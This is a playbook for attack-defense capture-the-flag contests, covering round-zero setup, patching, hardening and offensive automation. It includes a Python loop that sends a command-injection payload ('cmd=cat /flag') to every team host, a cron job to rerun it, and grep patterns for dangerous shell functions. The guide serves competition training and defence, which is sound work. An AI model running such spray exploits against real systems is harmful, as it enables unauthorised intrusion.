# Attack-Defense Playbook

Upstream covers Jeopardy only. A/D is a different sport: every team runs the same vulnerable services, you patch yours and exploit theirs.

## Round 0 (first 30 min — decides the event)

1. **Snapshot everything.** `tar czf /backups/round0.tgz /srv` — you will break things.
2. **Start all services locally, verify they run.**
3. **Get flags submitted for round 1** — most scoring weights early rounds. Submit your own flag via the checker immediately.
4. Map the attack surface: what services, what ports, what files, what users.
5. Find the vuln(s) — A/D vulns are deliberately simple: SQLi in one endpoint, command injection in one param, weak auth. Grep the webroot:
   ```bash
   grep -rn "system\|exec\|passthru\|shell_exec\|popen" /srv/web/
   grep -rn "SELECT.*\$_\|query(\$_\|eval(" /srv/web/
   grep -rn "md5\|sha1\|==" /srv/web/ | grep -i pass   # weak comparisons
   ```

## Patch strategy (defense)

- **Patch the bug, not the symptom.** Blocking an IP is useless — attacks rotate.
- **Minimal diffs.** Overzealous patches break the checker → service-down penalties (usually worse than getting exploited).
- **Test against the checker after every patch.** If you don't have the checker, replicate the valid traffic flow first.
- Common patches:
  ```bash
  # SQLi -> prepared statements / escape input
  # Command injection -> remove shell call, hardcode the constant
  # Weak auth -> fix the comparison (=== with hash_equals)
  # Path traversal -> basename() + allowlist
  ```
- WAF in front as belt-and-suspenders (nginx + ModSecurity or a tiny reverse filter), but never rely on it alone — smart teams bypass.
- **Honeytokens:** plant fake flags in obvious locations; teams that steal them waste time.
- Watch logs live: `tail -f /srv/logs/access.log | grep -v <checker-ip>` — the checker noise is huge, filter it.

## Attack strategy (offense)

1. Solve your own service first — you have the source, finding the vuln is fastest on your box.
2. Write the exploit once, **parameterize the target host**, spray every team:
   ```python
   import requests
   teams = [f"team{i}.adctf.net" for i in range(1, 33)]   # or IP range from VPN
   for t in teams:
       try:
           r = requests.get(f"http://{t}:5000/vuln?cmd=cat+/flag", timeout=3)
           if "flag{" in r.text or "CTF{" in r.text: print(t, r.text)
       except: pass
   ```
3. **Automation wins A/D.** Cron the sploit every round (flags rotate):
   ```bash
   # crontab -e
   * * * * * cd /root/ad && python3 sploit.py >> sploit.log 2>&1
   # plus auto-submit each round's flag via the CTFd/scoring API
   ```
4. Adapt when teams patch: keep a variant library (different injection points, encodings, second-order paths for the same bug).
5. Steal + reuse: other teams' exploits against you appear in your logs — read them, they're a free sploit for the rest of the grid.

## Defense stack (quick wins)

```bash
# Restrict service file perms
find /srv -name "*.php" -exec chmod 644 {} \;   # no write = harder webshells
# chattr critical files
chattr +i /srv/web/config.php                    # immutable (root-owned svc)
# Kill unused interpreters
chmod 750 /usr/bin/perl /usr/bin/python 2>/dev/null   # if services don't need them
# apparmor profile for the service user
```

## Infrastructure survival

- Monitor service-up status every round (the scoreboard shows it) — a down service usually scores worse than an exploited one.
- Keep a known-good service bundle; restore fast instead of debugging under fire.
- Track which teams patch which vuln in notes — target the lazy ones first.
